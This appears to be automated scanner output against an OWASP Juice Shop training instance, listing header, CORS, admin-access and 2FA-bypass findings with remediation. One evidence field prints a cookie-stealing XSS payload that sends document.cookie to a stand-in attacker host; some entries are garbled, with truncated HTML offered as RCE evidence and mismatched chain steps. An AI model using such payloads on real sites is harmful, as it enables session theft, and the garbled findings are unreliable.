findings.detail: Server returns Access-Control-Allow-Origin: * — any origin can read responses.
findings.evidence: ACAO: *
findings.remediation: Restrict ACAO to a specific trusted origin. Never use wildcard when credentials are involved.

findings.detail: CSP prevents XSS and data injection attacks by controlling allowed resource sources.
findings.evidence: Header 'Content-Security-Policy' not present in response
findings.remediation: Add a strict CSP: 'default-src \'self\'; script-src \'self\'; object-src \'none\';'

findings.detail: HSTS forces HTTPS connections and prevents SSL-stripping attacks.
findings.evidence: Header 'Strict-Transport-Security' not present in response
findings.remediation: Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

findings.detail: Missing Referrer-Policy may leak sensitive URL information to third parties.
findings.evidence: Header 'Referrer-Policy' not present in response
findings.remediation: Add: Referrer-Policy: strict-origin-when-cross-origin

findings.detail: Missing Permissions-Policy allows access to powerful browser APIs (camera, mic, etc.).
findings.evidence: Header 'Permissions-Policy' not present in response
findings.remediation: Add: Permissions-Policy: geolocation=(), camera=(), microphone=()

findings.detail: Missing COOP allows cross-origin pages to access window references.
findings.evidence: Header 'Cross-Origin-Opener-Policy' not present in response
findings.remediation: Add: Cross-Origin-Opener-Policy: same-origin

findings.detail: Missing CORP allows cross-origin pages to load this site's resources.
findings.evidence: Header 'Cross-Origin-Resource-Policy' not present in response
findings.remediation: Add: Cross-Origin-Resource-Policy: same-origin

findings.detail: Admin dashboard at https://juiceshop.akto.io/admin is directly accessible without login
findings.evidence: HTTP 200 | Dashboard indicators present without authentication
findings.remediation: Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible.

findings.detail: XSS confirmed in 'q'. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.
findings.evidence: Payload: <script>fetch('https://attacker.invalid/steal?c='+document.cookie);</script>
findings.remediation: Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.
findings.exploit_chain: XSS → Cookie Theft → Session Hijack → Account Takeover

<!doctype html>
<html lang="en" data-beasties-container>
<head>
  <meta charset="utf-8">
  <title>OWASP Juice Shop</title>
  <meta name="description" content="Probably the most modern and sophisticated insecure web application">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link id="favicon" rel="icon" type="image/x-icon" href="assets/public/f
findings.remediation: CRITICAL: Sanitize all shell inputs. Use subprocess with argument lists. Restrict OS command access from web layer.
findings.exploit_chain: RCE → Shell → Data Exfiltration / Lateral Movement

findings.evidence:
<!--
  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
  ~ SPDX-License-Identifier: MIT
  -->

<!doctype html>
<html lang="en" data-beasties-container>
<head>
  <meta charset="utf-8">
  <title>OWASP Juice Shop</title>
  <meta name="description" content="Probably the most modern and sophisticated insecure web application">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link id="favicon" rel="icon" type="image/x-icon" href="assets/public/f
findings.remediation: CRITICAL: Sanitize all shell inputs. Use subprocess with argument lists. Restrict OS command access from web layer.
findings.exploit_chain: RCE → Shell → Data Exfiltration / Lateral Movement

findings.evidence: None of common OTP paths returned OTP form.
findings.remediation: Implement TOTP-based 2FA (FIDO2/WebAuthn/RFC 6238) for all accounts.

findings.type: 2FA — No Rate Limiting on OTP (Brute-force Possible)
findings.detail: Tested 7 OTP codes with no lockout or 429 response.
findings.evidence: No rate-limit after 7 attempts
findings.remediation: Enforce max 5 attempts. Add exponential backoff and account lockout.

findings.evidence: HTTP 200 on /dashboard without 2FA session
findings.remediation: Enforce 2FA completion check on ALL protected routes via Senior ware.

findings.evidence: Cookie: mfa_verified=true → access granted to /dashboard
findings.remediation: Store 2FA state server-side in session, not in cookies.

findings.detail: Forged 'remember_me=1' cookie bypasses 2FA for trusted device.
findings.evidence: Cookie: remember_me=1
findings.remediation: Bind trusted device tokens to user+device fingerprint server-side. Sign tokens.

findings.detail: OAuth/SSO endpoint at '/auth/google' may log users in without 2FA. Social login commonly bypasses MFA if not explicitly enforced.
findings.evidence: OAuth endpoint: /auth/google → HTTP 200
findings.remediation: Enforce 2FA for OAuth-authenticated users. Check MFA status post-OAuth login.

findings.type: CHAIN: CORS Misconfiguration → XSS → Session Theft
findings.detail: Permissive CORS allows malicious origins to make authenticated API requests. Combined with XSS, attacker can send victim's session cookies to a controlled server via cross-origin fetch.
findings.evidence:
Step 1: [CORS Wildcard Origin] at https://juiceshop.akto.io
Step 2: [Missing Header: Content-Security-Policy] at https://juiceshop.akto.io
findings.remediation: Restrict CORS to trusted origins. Do not use wildcard (*) with credentials. Set HttpOnly + Secure + SameSite on cookies.
findings.attack_steps: CORS * → XSS on trusted subdomain → fetch(attacker.com, cookies) → Session Steal

findings.type: CHAIN: JWT None Algorithm → Admin Privilege Escalation
findings.detail: JWT with 'alg:none' or weak HS256 secret allows forging tokens with arbitrary claims (e.g. role:admin). This bypasses all role-based access controls.
findings.evidence:
Step 1: [XSS — Session Hijack Payload (Generated)] at https://juiceshop.akto.io
Step 2: [Admin Dashboard — No Authentication Required] at https://juiceshop.akto.io/admin
findings.remediation: Enforce RS256/ES256 algorithms. Reject 'none' algorithm. Validate all JWT claims server-side. Use short expiration times.
findings.attack_steps: JWT alg:none → Forge {role:admin} → Access admin panel → Full privilege escalation
